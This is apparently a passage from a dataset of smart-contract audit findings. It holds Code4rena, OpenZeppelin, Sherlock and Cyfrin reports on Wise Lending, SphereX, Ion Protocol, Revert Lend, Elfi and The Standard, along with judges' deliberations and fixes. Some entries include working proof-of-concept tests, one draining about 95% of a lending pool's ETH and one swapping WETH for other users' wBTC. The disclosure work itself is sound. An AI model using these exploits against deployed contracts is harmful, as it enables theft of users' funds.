>         assertEq(la, 0);
> 
>         vm.stopPrank();
>         
>         uint lendingWethBalance = WETH.balanceOf(address(LENDING_INSTANCE));
> 
>         console.log(""lb "", lendingWethBalance);
>         console.log(""bb "", borrower.balance);
> 
>         vm.startPrank(borrower);
> 
>         // borrow 95% of ALL ETH that the protocol possesses
>         // this works, because when calculating health check of a position
>         // it iterates through `getPositionBorrowTokenLength()` - and we
>         // were able to remove it.
>         debtShares = LENDING_INSTANCE.borrowExactAmountETH(nftIdLiquidatee, WETH.balanceOf(address(LENDING_INSTANCE)) * 95 / 100); // borrow ETH
> 
>         console.log(""lb "", WETH.balanceOf(address(LENDING_INSTANCE)));
>         console.log(""ba "", borrower.balance);
> 
>         // make sure that borrow tokens were not increased
>         uint256 la2 = LENDING_INSTANCE.getPositionBorrowTokenLength(
>             nftIdLiquidatee
>         );
>         assertEq(la2, 0);
> 
>         // verify that ~95% were taken from the pool and borrower received them
>         assertLt(WETH.balanceOf(address(LENDING_INSTANCE)), lendingWethBalance * 6 / 100);
>         assertGt(borrower.balance, lendingWethBalance * 94 / 100);
> 
>         uint256 ethValueAfter2 = SECURITY_INSTANCE.getETHBorrow(
>             nftIdLiquidatee,
>             address(MOCK_ERC20_2)
>         );
>         console.log(""ethAfter2 "", ethValueAfter2);
>         vm.stopPrank();
> 
>         // borrowing doesn't increase user borrow
>         assertEq(ethValueAfter, ethValueAfter2);
>     }
> }
> ```
> 
> </details>
>
> At the end of the test, it's verified that user is in possession of ~95% of the ETH that was initially deposited to the pool.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2027095241):**
 > Confirmed the test passes. 
 >
> ```
> [PASS] testRemovingToken() (gas: 2242360)
> Logs:
>   ORACLE_HUB_INSTANCE DEPLOYED AT ADDRESS 0x6D93d20285c95BbfA3555c00f5206CDc1D78a239
>   POSITION_NFTS_INSTANCE DEPLOYED AT ADDRESS 0x1b5a405a4B1852aA6F7F65628562Ab9af7e2e2e9
>   LATEST RESPONSE 1000000000000000000
>   ethBefore  300000000000000000
>   ethAfter  300000000000000000
>   lb  195100000000000000001
>   bb  5000000000000000000
>   lb  9755000000000000001
>   ba  190345000000000000000
>   ethAfter2  300000000000000000
> ```
> 
> The likelihood/impact are in line with high severity.
> A POC was not initially provided, but the step by step given is deemed sufficient.

**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2027309902):**
 > @Foon256 or @vonMangoldt - can check this again I think. I'll check what kind of code change we need to add in order to prevent this scenario.

**[Foon256 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2029781697):**
 > The POC is correct but different from the previous presented attack, which was not possible as @vonMangoldt has shown. I don't know about the rules in this case, because the POC has been submitted long after the deadline and is a different attack than submitted before.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2030208760):**
 > The warden's identification of the root cause is correct and the severity is correct. If there were different submissions this would have gotten a 50%, but for solo finds there is no mechanism for partial scoring.

**[Alex the Entreprenerd (Appellate Court lead judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2056792265):**
 > ### Summary of the issue
 >
> Due to an incorrect logic, it is possible for a user to have all of their debt forgiven by repaying another bad debt position with a non-existing token.
> 
> ### Alex the Entreprenerd‚Äôs (Appellate Court lead judge) input
>
> Facts:
> 1. `paybackBadDebtNoReward` can be called with non existent `paybacktoken`.
> 2. First `poolToken` bad debt position will be deleted by default.
> 3. Remove position in the original submission is not fully clear, but is implicitly mentioning using `_deleteLastPositionBorrowDatafor` `_removePositionData`.
> 4. This will forgive the bad debt and break the system.
> 5. Was disputed due to this.
> 
> This asserts that the attack cannot be done atomically, that's true.
>
> 6. The original submission explains that, due to generating bad debt.
> 
> I believe that the finding has shown a way for bad debt to be forgiven, and that the race condition around ""proper"" vs ""malicious"" liquidators is not a major decision factor.
> 
> I would like to add that the original submission is passable but should have done a better job at:
> - Using only necessary snippets, with comments and tags.
> - Explain each logical step more simply (A calls B, B is pointer to C, C is doing X).
> 
> I believe the root cause and the attack was shown in the original submission and as such believe the finding to be valid and high severity.
>
> ### hickuphh3's (judge 2) input
>
> This issue should‚Äôve been accompanied with a POC, then there would be no disambiguity over its validity and severity.
> 
> I agree with the judge‚Äôs assessment. The warden correctly identified the root cause of lacking input validation of `_poolToken`, which allows `_removePositionData` to incorrectly remove borrowed positions, thus erasing that user‚Äôs debt. 
> 
> The severity of this alone is high, as it effectively allows the user to forgo repaying his debt.
> 
> I disagree with the statement that the POC is different from the previous presented attack. It is roughly the same as the presented step-by-step walkthrough, with amplified impact: the user is able to borrow more tokens for free subsequently, without having to repay.
> 
> Disregarding the POC that was submitted after the audit, IMO, the line-by-line walkthrough sufficiently proved the issue. 
> 
> ### LSDan‚Äôs (judge 3) Input
> I think this one should be held as invalid due to [this ruling](https://docs.code4rena.com/awarding/judging-criteria/supreme-court-decisions-fall-2023#verdict-standardization-of-additional-warden-output-during-qa) in Decisions from the inaugural Supreme Court session.
>
> As far as I can see, the swaying information was the POC added after the submission deadline. It doesn't matter if the issue was technically correct. The quality was not high enough to lead the judge to mark it as satisfactory without the additional information. @Alex The Entreprenerd thoughts?
> 
> **Alex The Entreprenerd (Appellate Court lead judge) commented:**
> I don't think the POC added any additional info that was not present in the original submission. Invalid token causes default pop of real token. That was identified in the original submission.
> 
> I think the dispute by the sponsor was incorrect as asserting that this cannot be done atomically doesn't justify the bug of mismatch address causing defaults being forgiven. I think the POC added context over content.
> 
> **LSDan (judge 3) commented:** 
>Apologies guys... didn't read it carefully enough on the first pass. I've re-evaluated and while I don't like the quality of the original submission and would probably have invalidated it myself, I'm willing to align with the two of you and leave it as high risk. The attack is valid and the nuance is in interpreting rules, not validity.
> 
> ### Additional input from the Sponsor (Requested by the Lead Judge) via discord
> 
> **Alex The Entreprenerd (Appellate Court lead judge) commented:**
> For issue 215, I'd like to ask you what you think was invalid about the first submission and what's specifically makes the original submission different from the POC sent after? We understand that the quality of the original submission is sub optimal.
> 
> **Foon (Wise Lending):**
> Referenced the original comment [here](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2009516270).
>
> **Alex The Entreprenerd (Appellate Court lead judge) commented:**
> This makes sense as there is no way to attack the protocol in the same tx. However, if the price were to fall, then wouldn't the attacker be able to apply the attack mentioned in the original submission?
> 
> **hodldoor (Wise Lending) commented:**
> They will be liquidated beforehand. That why the submittor mentioned it is necessary to create a position which is small hence no incentivize to liquidate. Again, the way described by submittor does not work as pointed out in github and here again.
> 
> **Alex The Entreprenerd (Appellate Court lead judge) commented:**
> My understanding of the issue is that by specifying a non-existing token for liquidation, the first token is popped without paying for the position debt. Am I missing something about this?
> 
> **hodldoor (Wise Lending) commented:**
> Not for liquidation.<br>
> For payingback edit: `paybackBadDebtNoReward` only works for positions with bad debt, but bad debt usually accrues with debt and no collateral. Only time it doesn't is if collateral is so small gas is more expensive than to liquidate beforehand while price from collateral is falling.
> 
> **Foon (Wise Lending) commented:**
> For payingback bad debt positions with `paybackBadDebtNoReward()`, we added this feature to be able to remove bad debt from the protocol. User can do it and get a little incentive with `paybackBadDebtForToken()` or a generous donor. The team can pay it back for free with `paybackBadDebtNoReward()`. `paybackBadDebtForToken()` is only possible if there is some collateral left in the bad debt position nft.
> 
> **hodldoor (Wise Lending) commented:**
> the for free part is technically not needed anymore anyway since we opened paying back for everyone
> 
> **Alex The Entreprenerd (Appellate Court lead judge) commented:**
> Ok. What do you think changed from the original submission and the POC that makes the finding different?
> 
> **hodldoor (Wise Lending) commented:**
> You mean the PoC after deadline which is, therefore, not counted? He just manipulates price so that no one has the chance to liquidate. If we look at the point from the poc provided AFTER deadline (invalid therefore anyway), then we conclude it's an `expectedValue` question.
>
> Attacker either donates liquidation incentives to liquidators and therefore, loses money (10%). Or gains money if he's lucky that he doesn't get liquidated within a 10-20% price difference and gets to call the other function first.
> So if you think as an attacker the probability that ETH drops 20% in one chainlink update (as far as I know, that has never happened before) or that during a 20% drawdown liquidators don't get put into a block and this likelihood is bigger than 5% OVERALL then you would make money.
>
>The chance of liquidators not picking up free money I would say is more in the low 0.001% estimation rather than 5%. So on average it's highly minus -ev to do that.
> 
> **Alex The Entreprenerd (Appellate Court lead judge) commented:**
> Good points, thank you for your thoughts! What are your considerations about the fact that the attacker could just participate in the MEV race, allowing themselves to either front-run or be the first to self-liquidate as a means to enact the attack?
> 
> Shouldn't the system ideally prevent this scenario from ever being possible?
> 
> **The Wise Admiral (Wise Lending) commented:**
> I'll let my devs comment on your question about the attacker participating as a liquidator, but as far as the last part about ""shouldn't the system prevent""
> 
> I do not believe our position on this finding is that it's objectively invalid. In fact, I'm sure we have already patched it for our live code which is already deployed on Arbitrum. Our position is that, per the C4 rules the submission is invalid for this specific competitive audit Feb 19th - March 11th and should not be listed in the findings or receive rewards, as it would be unfair to take away money from the other wardens who did submit findings in the time frame given. That being said, we are willing to accept it as a medium finding as a compromise.
>
> **hodldoor (Wise Lending) commented:**
> The attack does not start with liquidating it is stopped by liquidating (including if the attacker liquidates), if it's in time relating to liquidation incentive vs distance between collateral in debt in percentage. That's why in a poc you need to manipulate price instantly a great deal without being liquidated (doesn't matter by whom).
> 
> ### Deliberation
> 
> We believe that the dispute from the Sponsor comes from a misunderstanding of the submission which ultimately shows an incorrect logic when dealing with liquidations.
> 
> While the specifics of the submission leave a lot to be desired, the original submission did identify the root cause, this root cause can be weaponized in a myriad of ways, and ultimately gives the chance to an underwater borrower to get a long forgiven.
> 
> For this reason we believe the finding to be a High Severity finding.
> 
> ### Additional Context by the Lead Judge
> 
> We can all agree that a POC of higher quality should have been sent, that said our objective at C4 is to prevent real exploits, over a sufficiently long span of time, dismissing barely passable findings would cause more exploits, which will cause real damage to Projects and People using them as well as taint the reputation of C4 as a place where ‚ÄúNo stone is left unturned‚Äù.
> 
> I would recommend the staff to look into ways to penalize these types of findings (for example, give a bonus to the judge as an extensive amount of time was necessary to prove this finding).
> 
> But I fail to see how dismissing this report due to a lack of POC would help the Sponsor and Code4rena over the long term.

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215#issuecomment-2082895779):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

***",Wise Lending,Dup1337,HIGH,,200000,0,0,0,https://github.com/code-423n4/2024-02-wise-lending-findings/issues/215,https://code4rena.com/reports/2024-02-wise-lending,,https://code4rena.com/reports/2024-02-wise-lending,solodit_reports,4c6a74942223e43dccc9d21f3a256323,2024-05-07 00:39:06,2024-10-15 01:21:04,1,"function paybackBadDebtNoReward(
        uint256 _nftId,
        address _paybackToken,
        uint256 _shares
    )
        external
        returns (uint256 paybackAmount)
    {
        updatePositionCurrentBadDebt(
            _nftId
        );

        if (badDebtPosition[_nftId] == 0) {
            return 0;
        }

        if (WISE_LENDING.getTotalDepositShares(_paybackToken) == 0) {
            revert PoolNotActive();
        }

        paybackAmount = WISE_LENDING.paybackAmount(
            _paybackToken,
            _shares
        );

        WISE_LENDING.corePaybackFeeManager(
            _paybackToken,
            _nftId,
            paybackAmount,
            _shares
        );

        _updateUserBadDebt(
            _nftId
        );

        emit PayedBackBadDebtFree(
            _nftId,
            msg.sender,
            _paybackToken,
            paybackAmount,
            block.timestamp
        );

        _safeTransferFrom(
            _paybackToken,
            msg.sender,
            address(WISE_LENDING),
            paybackAmount
        );
    }
```
    function _removePositionData(
        uint256 _nftId,
        address _poolToken,
        function(uint256) view returns (uint256) _getPositionTokenLength,
        function(uint256, uint256) view returns (address) _getPositionTokenByIndex,
        function(uint256, address) internal _deleteLastPositionData,
        bool isLending
    )
        private
    {
        uint256 length = _getPositionTokenLength(
            _nftId
        );

        if (length == 1) {
            _deleteLastPositionData(
                _nftId,
                _poolToken
            );

            return;
        }

        uint8 i;
        uint256 endPosition = length - 1;

        while (i < length) {

            if (i == endPosition) {
                _deleteLastPositionData(
                    _nftId,
                    _poolToken
                );

                break;
            }

            if (_getPositionTokenByIndex(_nftId, i) != _poolToken) {
                unchecked {
                    ++i;
                }
                continue;
            }

            address poolToken = _getPositionTokenByIndex(
                _nftId,
                endPosition
            );

            isLending == true
                ? positionLendTokenData[_nftId][i] = poolToken
                : positionBorrowTokenData[_nftId][i] = poolToken;

            _deleteLastPositionData(
                _nftId,
                _poolToken
            );

            break;
        }
    }",
1775963,34d107fc4b4e41ae61dcf37498c23b91,Mutually Exclusive Modes are Allowed at the Same Time,OpenZeppelin,2023-08-09,"Both operational modes can be activated simultaneously, which leads to a conflict as their resetting logics are mutually exclusive. Specifically, one mode resets with each new transaction, while the other resets at each external call. The existing documentation further indicates that these modes are intended to operate individually rather than concurrently.


Consider adopting an Enum implementation for the modes to enforce exclusivity. Alternatively, input validation can be added on mode setters to prevent invalid configurations.


***Update**: Resolved in [pull request #10](https://github.com/spherex-collab/spherex-protect/pull/10) at commit [d221420](https://github.com/spherex-collab/spherex-protect/pull/10/commits/d221420d094bcebd323ce2f93a778fafb70a95db).*",SphereX Audit,OpenZeppelin,HIGH,,,0,0,0,,https://blog.openzeppelin.com/spherex-audit,,,solodit_reports,d4b78eacbf96961d4093c5a363fb474b,2024-05-28 00:07:44,2024-10-15 00:25:23,1,,
1776211,e3b50227a7330a46fab7b77638dbc96a,No Access Control on ReserveFeed Contract,OpenZeppelin,2024-01-22,"The [`ReserveFeed` contract](https://github.com/Ion-Protocol/ion-protocol/blob/98e282514ac5827196b49f688938e1e44709505a/src/oracles/reserve/ReserveFeed.sol#L4) tracks exchange rates for each collateral type. The [`setExchangeRate` function](https://github.com/Ion-Protocol/ion-protocol/blob/98e282514ac5827196b49f688938e1e44709505a/src/oracles/reserve/ReserveFeed.sol#L7) does not contain any access control or input validation. This would allow anyone to set any price for any collateral type.


Consider implementing access control on the `setExchangeRate` function to ensure that only trusted users can update the tracked rates.


***Update:** Resolved in [pull request #20](https://github.com/Ion-Protocol/ion-protocol/pull/20).*",Ion Protocol Audit,OpenZeppelin,HIGH,,,0,0,0,,https://blog.openzeppelin.com/ion-protocol-audit,,,solodit_reports,25828a7ba46591302f0c0f4b7ddf9487,2024-05-28 00:53:25,2024-10-15 01:10:00,1,"contract ReserveFeed {
```
    function setExchangeRate(uint8 _ilkIndex, uint256 _exchangeRate) external {",
1776453,5de285106c58ab847637e635f190720a,[H-01] `V3Vault.sol` permit signature does not check receiving token address is USDC,Code4rena,2024-03-04,"In `V3Vault.sol` there all 3 instances of `permit2.permitTransferFrom()`, all 3 does not check token transfered in is USDC token.
Allowing user to craft permit signature from any ERC20 token and Vault will accept it as USDC.

### Impact

User can steal all USDC from vault using permit signature of any ERC20 token.

### Proof of Concept

Here is how Vault accept USDC from user. Vault will accept `Uniswap.Permit2` signature transfer allowance from Permit2 then to vault contract.

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L877C1-L917C6>

```solidity
    if (params.permitData.length > 0) {
        (ISignatureTransfer.PermitTransferFrom memory permit, bytes memory signature) =
            abi.decode(params.permitData, (ISignatureTransfer.PermitTransferFrom, bytes));
        permit2.permitTransferFrom(
            permit,
            ISignatureTransfer.SignatureTransferDetails(address(this), state.liquidatorCost),
            msg.sender,
            signature
        );
    } else {
        // take value from liquidator
        SafeERC20.safeTransferFrom(IERC20(asset), msg.sender, address(this), state.liquidatorCost);
    }
```

Below is permit signature struct that can be decoded from user provided data:

```solidity
interface ISignatureTransfer is IEIP712 {
    /// @notice The token and amount details for a transfer signed in the permit transfer signature
    struct TokenPermissions {
        // ERC20 token address
        address token;
        // the maximum amount that can be spent
        uint256 amount;
    }

    /// @notice The signed permit message for a single token transfer
    struct PermitTransferFrom {
        TokenPermissions permitted;
        // a unique value for every token owner's signature to prevent signature replays
        uint256 nonce;
        // deadline on the permit signature
        uint256 deadline;
    }
}
```

`V3Vault.sol` needs to check `TokenPermissions.token` is USDC, same as vault main asset.

`Uniswap.permit2.permitTransferFrom()` only checks if the sign signature is correct. This is meaningless as Vault does not validate input data.

This allows users to use any ERC20 token, gives allowance and permits to `Uniswap.Permit2`. The Vault will accept any transfer token from `Permit2` as USDC. Allowing users to deposit any ERC20 token and steal USDC from vault.

### Recommended Mitigation Steps

Fix missing user input validations in 3 all instances of `permit2`:

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L717C1-L725C15><br>
<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L893C1-L898C15><br>
<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L877C1-L917C6>

```solidity
    if (params.permitData.length > 0) {
        (ISignatureTransfer.PermitTransferFrom memory permit, bytes memory signature) =
            abi.decode(params.permitData, (ISignatureTransfer.PermitTransferFrom, bytes));
        require(permit.permitted.token == asset, ""V3Vault: invalid token"");
        //@permitted amount is checked inside uniswap Permit2
        permit2.permitTransferFrom(
            permit,
            ISignatureTransfer.SignatureTransferDetails(address(this), state.liquidatorCost),
            msg.sender,
            signature
        );
    } else {
        // take value from liquidator
        SafeERC20.safeTransferFrom(IERC20(asset), msg.sender, address(this), state.liquidatorCost);
    }
```

### Assessed type

ERC20

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/368#issuecomment-2021029140)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> PR [here](https://github.com/revert-finance/lend/pull/19) - checks token in permit.

**Status:** Mitigation confirmed. Full details in reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/76), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/9) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/7).

***",Revert Lend,VAD37|jesusrod15|ayden|1|2|3|ArsenLupin|santiellena,HIGH,,88500,0,0,0,https://github.com/code-423n4/2024-03-revert-lend-findings/issues/368,https://code4rena.com/reports/2024-03-revert-lend,,https://code4rena.com/reports/2024-03-revert-lend,solodit_reports,da5e798e46ba7a58d4bc35235c2c2ff3,2024-05-28 01:13:11,2024-10-15 01:24:57,1,"function _deposit(address receiver, uint256 amount, bool isShare, bytes memory permitData)
        internal
        returns (uint256 assets, uint256 shares)
    {
        (, uint256 newLendExchangeRateX96) = _updateGlobalInterest();

        _resetDailyLendIncreaseLimit(newLendExchangeRateX96, false);

        if (isShare) {
            shares = amount;
            assets = _convertToAssets(shares, newLendExchangeRateX96, Math.Rounding.Up);
        } else {
            assets = amount;
            shares = _convertToShares(assets, newLendExchangeRateX96, Math.Rounding.Down);
        }

        if (permitData.length > 0) {
            (ISignatureTransfer.PermitTransferFrom memory permit, bytes memory signature) =
                abi.decode(permitData, (ISignatureTransfer.PermitTransferFrom, bytes));
            permit2.permitTransferFrom(
                permit, ISignatureTransfer.SignatureTransferDetails(address(this), assets), msg.sender, signature
            );
        } else {
            // fails if not enough token approved
            SafeERC20.safeTransferFrom(IERC20(asset), msg.sender, address(this), assets);
        }

        _mint(receiver, shares);

        if (totalSupply() > globalLendLimit) {
            revert GlobalLendLimit();
        }

        if (assets > dailyLendIncreaseLimitLeft) {
            revert DailyLendIncreaseLimit();
        } else {
            dailyLendIncreaseLimitLeft -= assets;
        }

        emit Deposit(msg.sender, receiver, assets, shares);
    }
```
        if (params.permitData.length > 0) {
            (ISignatureTransfer.PermitTransferFrom memory permit, bytes memory signature) =
                abi.decode(params.permitData, (ISignatureTransfer.PermitTransferFrom, bytes));
            permit2.permitTransferFrom(
                permit,
                ISignatureTransfer.SignatureTransferDetails(address(this), state.liquidatorCost),
                msg.sender,
                signature
            );
```
        if (permitData.length > 0) {
            (ISignatureTransfer.PermitTransferFrom memory permit, bytes memory signature) =
                abi.decode(permitData, (ISignatureTransfer.PermitTransferFrom, bytes));
            permit2.permitTransferFrom(
                permit, ISignatureTransfer.SignatureTransferDetails(address(this), assets), msg.sender, signature
            );
```
    function _deposit(address receiver, uint256 amount, bool isShare, bytes memory permitData)
        internal
        returns (uint256 assets, uint256 shares)
    {
        (, uint256 newLendExchangeRateX96) = _updateGlobalInterest();

        _resetDailyLendIncreaseLimit(newLendExchangeRateX96, false);

        if (isShare) {
            shares = amount;
            assets = _convertToAssets(shares, newLendExchangeRateX96, Math.Rounding.Up);
        } else {
            assets = amount;
            shares = _convertToShares(assets, newLendExchangeRateX96, Math.Rounding.Down);
        }

        if (permitData.length > 0) {
            (ISignatureTransfer.PermitTransferFrom memory permit, bytes memory signature) =
                abi.decode(permitData, (ISignatureTransfer.PermitTransferFrom, bytes));
            permit2.permitTransferFrom(
                permit, ISignatureTransfer.SignatureTransferDetails(address(this), assets), msg.sender, signature
            );
        } else {
            // fails if not enough token approved
            SafeERC20.safeTransferFrom(IERC20(asset), msg.sender, address(this), assets);
        }

        _mint(receiver, shares);

        if (totalSupply() > globalLendLimit) {
            revert GlobalLendLimit();
        }

        if (assets > dailyLendIncreaseLimitLeft) {
            revert DailyLendIncreaseLimit();
        } else {
            dailyLendIncreaseLimitLeft -= assets;
        }

        emit Deposit(msg.sender, receiver, assets, shares);
    }",
1777393,9502b35bfe853ddcec6e0f74524fe96b,H-19: Users can use weth to replace any margin token in createUpdatePositionMarginRequest(),Sherlock,2024-06-20,"# Issue H-19: Users can use weth to replace any margin token in createUpdatePositionMarginRequest() 

Source: https://github.com/sherlock-audit/2024-05-elfi-protocol-judging/issues/79 

## Found by 
jennifer37
## Summary
Function `createUpdatePositionMarginRequest` lack enough input validation. This will cause users can use weth as any margin tokens to earn profits or block other users' normal request.

## Vulnerability Detail
In function `createUpdatePositionMarginRequest`, users will transfer some tokens if they want to increase their position's init margin amount. If `params.isNativeToken` is true, users need to transfer WETH, otherwise, users need to transfer margin token.

The vulnerability is that when we create one request via `createUpdatePositionMarginRequest`, `params.marginToken` is used as `request.marginToken`. So if the input `params.isNativeToken` is true and `params.marginToken` is not WETH, for example, the updated position is one wBTC position, we will transfer some amount of ether to the Trade Vault when we create one request, and then when the keeper execute the request, system will transfer the same amount of wBTC to LP Pool. 
In normal cases, the request cannot be executed successfully, because there is not enough wBTC in Trade Vault. However, considering that there are lots of request now, and traders are transferring their wBTC to Trade Vault, the hacker can make use of this vulnerability to use WETH to get the same amount of other tokens.

```javascript
    function createUpdatePositionMarginRequest(UpdatePositionMarginParams calldata params) external payable override {
        ......
        if (params.isAdd) {
            require(!params.isNativeToken || msg.value == params.updateMarginAmount, ""Deposit eth amount error!"");
            AssetsProcess.depositToVault(
                AssetsProcess.DepositParams(
                    account,
                    params.isNativeToken ? AppConfig.getChainConfig().wrapperToken : params.marginToken,
                    params.updateMarginAmount,
                    AssetsProcess.DepositFrom.ORDER,
                    params.isNativeToken
                )
            );
        }
       ......
        PositionMarginProcess.createUpdatePositionMarginRequest(
            account,
            params,
            updateMarginAmount,
            isExecutionFeeFromTradeVault
        );
    }
```
```javascript
    function createUpdatePositionMarginRequest(
        address account,
        IPosition.UpdatePositionMarginParams memory params,
        uint256 updateMarginAmount,
        bool isExecutionFeeFromTradeVault
    ) external {
        uint256 requestId = UuidCreator.nextId(UPDATE_MARGIN_ID_KEY);
        UpdatePositionMargin.Request storage request = UpdatePositionMargin.create(requestId);
        request.account = account;
        request.positionKey = params.positionKey;
        request.marginToken = params.marginToken;
        request.updateMarginAmount = updateMarginAmount;
        request.isAdd = params.isAdd;
        request.isExecutionFeeFromTradeVault = isExecutionFeeFromTradeVault;
        request.executionFee = params.executionFee;
        request.lastBlock = ChainUtils.currentBlock();
        emit CreateUpdatePositionMarginEvent(requestId, request);
    }
```
```javascript
    function updatePositionMargin(uint256 requestId, UpdatePositionMargin.Request memory request) external {
        Position.Props storage position = Position.load(request.positionKey);
        .......
        Symbol.Props memory symbolProps = Symbol.load(position.symbol);
        Account.Props storage accountProps = Account.load(request.account);
        //add margin, transfer from vault to LP Pool
        if (request.isAdd) {
            AddPositionMarginCache memory cache;
            cache.stakeToken = symbolProps.stakeToken;
            cache.addMarginAmount = request.updateMarginAmount;
            cache.marginTokenDecimals = TokenUtils.decimals(position.marginToken);
            cache.marginTokenPrice = OracleProcess.getLatestUsdUintPrice(position.marginToken, !position.isLong);
            cache.isCrossMargin = false;
            _executeAddMargin(position, cache);
            VaultProcess.transferOut(
                IVault(address(this)).getTradeVaultAddress(),
                request.marginToken,
                symbolProps.stakeToken,
                cache.addMarginAmount
            );
            position.emitPositionUpdateEvent(requestId, Position.PositionUpdateFrom.ADD_MARGIN, 0);
```

### Poc
Add this test in increaseMarketOrder.test.ts, the procedure is like:
- User0 open one Long BTC position.
- User1 open one Long BTC position.
- User0 create one update margin request, with `isNative` = true, transfer ETHER to Trade Vault
- User1 create one normal update margin request, transfer wBTC to the Trade Vault.
- Keeper execute user0's request, transfer wBTC to LP Pool.
- If there's no enough wBTC balance in Trade Vault, user1's request cannot be executed.

```javascript
  it.only('Case2: update margin request', async function () {
    // Step 1: user0 create one position BTC
    console.log(""User0 Long BTC "");
    const orderMargin1 = precision.token(1, 17) // 0.1BTC
    const btcPrice1 = precision.price(50000)
    const btcOracle1 = [{ token: wbtcAddr, minPrice: btcPrice1, maxPrice: btcPrice1 }]
    const executionFee = precision.token(2, 15)

    await handleOrder(fixture, {
      orderMargin: orderMargin1,
      oracle: btcOracle1,
      marginToken: wbtc,
      account: user0,
      symbol: btcUsd,
      executionFee: executionFee,
    })
    // Step 2: user1 create one position BTC
    console.log(""User1 Long BTC"");
    await handleOrder(fixture, {
      orderMargin: orderMargin1,
      oracle: btcOracle1,
      marginToken: wbtc,
      account: user1,
      symbol: btcUsd,
      executionFee: executionFee,
    })
    // Step 3: user0
    console.log(""User0 update position"")
    // user0 use weth
    let positionInfo = await positionFacet.getSinglePosition(user0.address, btcUsd, wbtcAddr, false)
    console.log(positionInfo.key);
    console.log(positionInfo.initialMargin);
    let tx = await positionFacet.connect(user0).createUpdatePositionMarginRequest(
      {
        positionKey: positionInfo.key,
        isAdd: true,
        isNativeToken: true,
        marginToken: wbtc,
        updateMarginAmount: precision.token(1, 17),
        executionFee: executionFee,
      },
      {
        value: precision.token(1, 17),
      },
    )

    await tx.wait()

    // Step 3.1 check
    const wethTradeVaultBalance = BigInt(await weth.balanceOf(tradeVaultAddr))
    console.log(""WETH in trade vault: "", wethTradeVaultBalance);
    let requestId = await marketFacet.getLastUuid(UPDATE_MARGIN_ID_KEY)
    console.log(""Request Id: "", requestId);
    // Step 4: user1
    console.log(""User1 update position"")
    // user1 use wbtc
    positionInfo = await positionFacet.getSinglePosition(user1.address, btcUsd, wbtcAddr, false)
    console.log(positionInfo.key);
    console.log(positionInfo.initialMargin);
    wbtc.connect(user1).approve(diamondAddr, precision.token(1, 17))

    tx = await positionFacet.connect(user1).createUpdatePositionMarginRequest(
      {
        positionKey: positionInfo.key,
        isAdd: true,
        isNativeToken: false,
        marginToken: wbtc,
        updateMarginAmount: precision.token(1, 17),
        executionFee: executionFee,
      },
      {
        value: executionFee,
      },
    )

    await tx.wait()
    // Step 3.1 check
    let wbtcTradeVaultBalance = BigInt(await wbtc.balanceOf(tradeVaultAddr))
    console.log(""wbtc in trade vault: "", wbtcTradeVaultBalance);

    // Step 5: execute user0 update request
    const tokenPrice = precision.price(50000)
    const oracle = [{ token: wbtcAddr, targetToken: ethers.ZeroAddress, minPrice: tokenPrice, maxPrice: tokenPrice }]
    tx = await positionFacet.connect(user3).executeUpdatePositionMarginRequest(requestId, oracle)
    await tx.wait()
    wbtcTradeVaultBalance = BigInt(await wbtc.balanceOf(tradeVaultAddr))
    console.log(""wbtc in trade vault: "", wbtcTradeVaultBalance);
  })
```
## Impact
- Users can use Ether to get the same amount of other tokens. This may get some profits.
- Other users' normal request may be blocked and may not be cancelled because there is not enough balance to return back.

## Code Snippet
https://github.com/sherlock-audit/2024-05-elfi-protocol/blob/main/elfi-perp-contracts/contracts/facets/PositionFacet.sol#L22-L59

## Tool used

Manual Review

## Recommendation
Add the related input validation. If `isNative` is true, we need to make sure the related position's margin token is WETH.



## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/0xCedar/elfi-perp-contracts/pull/37",Elfi,jennifer37,HIGH,,33730 USDC,0,0,0,https://github.com/sherlock-audit/2024-05-elfi-protocol-judging/issues/79,,,https://app.sherlock.xyz/audits/contests/329,solodit_reports,,2024-07-16 01:54:07,2024-10-15 02:01:53,1,,
1836221,51b7feccbc06f47d5ae4b971fd939a24,USDs stability can be compromised as collateral can be stolen by removing Hypervisor tokens directly from a vault without repaying USDs debt,Cyfrin,2024-09-13,"**Description:** When the owner of a Smart Vault calls [`SmartVaultV4::depositYield`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L167-L180), [`SmartVaultYieldManager::deposit`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L299-L310) is invoked to deposit the specified collateral tokens to a given Gamma Vault (aka Hypervisor) via the [`IUniProxy`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/interfaces/IUniProxy.sol#L6) contract. Gamma Hypervisors work such that they hold a position in a Uniswap V3 pool that is made fungible to depositors who own shares in this position represented as an ERC-20 token. On completion of a deposit, the Hypervisor tokens are transferred back to the calling `SmartVaultV4` contract where they remain as backing for any minted `USDs` debt.

